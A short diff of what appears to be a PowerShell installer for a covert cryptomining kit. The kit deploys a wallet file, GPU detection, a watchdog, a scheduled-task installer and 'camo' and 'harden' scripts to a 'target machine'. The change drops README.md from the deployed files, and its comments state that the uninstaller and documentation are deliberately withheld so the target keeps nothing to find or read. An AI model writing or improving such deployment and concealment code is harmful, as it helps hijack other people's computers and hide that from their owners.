@@ -109,12 +109,12 @@ Say "[+] source: $src"
 
 $payload = @(
     'controller.py', 'gpudetect.py', 'config_high.json', 'manifest.json',
-    # NOTE: uninstall.ps1 is deliberately NOT deployed. It resolves the install
-    # dir from LOCALAPPDATA/ProgramData by itself, so the operator runs it from
-    # the kit; a target machine keeps no uninstaller to find, read or use.
+    # NOTE: uninstall.ps1 and all documentation are deliberately NOT deployed.
+    # uninstall.ps1 resolves the install dir itself, so the operator runs it
+    # from the kit; README/WORKFLOW are for us, not for the target machine.
     'wallet.txt', 'watchdog.ps1', 'install-task.ps1',
     'restore-system.ps1', 'harden.ps1', 'camo.ps1', 'check-updates.ps1',
-    'README.md', 'REMOTE.cmd'
+    'REMOTE.cmd'
 )
 
 # ---- runtime selection ------------------------------------------------------
